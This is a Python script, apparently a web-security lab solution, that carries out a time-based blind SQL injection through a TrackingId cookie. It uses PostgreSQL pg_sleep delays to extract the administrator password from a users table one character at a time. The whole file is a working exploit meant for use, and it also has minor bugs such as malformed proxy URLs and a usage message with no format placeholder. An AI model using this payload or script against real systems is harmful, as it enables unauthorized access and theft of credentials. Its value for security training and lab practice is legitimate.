import requests
import urllib3
import sys
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http:127.0.0.1:8080', 'https': 'http:127.0.0.1:8080'}


def sqli_time(url):
    password_extraced = ""
    for i in range(1, 21):  # must update TrackingId, session values
        for j in range(32, 126):
            sql_payload = "' || (SELECT CASE WHEN (ascii(SUBSTRING(password,%s,1)) = '%s') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator')--" % (i, j)
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId': 'AhudYhx06pJARtrY' + sql_payload_encoded,
                       'session': 'Jbsxdeb9w3AaZDB0jkDI0bKeIAM9NFXn'}
            r = requests.get(url, cookies=cookies,
                             verify=False, proxies=proxies)
            time_delay = int(r.elapsed.seconds)
            if time_delay > 4:
                password_extraced += chr(j)
                sys.stdout.write('\r' + password_extraced)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extraced + chr(j))
                sys.stdout.flush()
    return password_extraced


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("Retrieving the administrator password...\n")
    sqli_time(url)
    print("\nThe administrator password is\n: %s" % sqli_time(url))


if __name__ == "__main__":
    main()
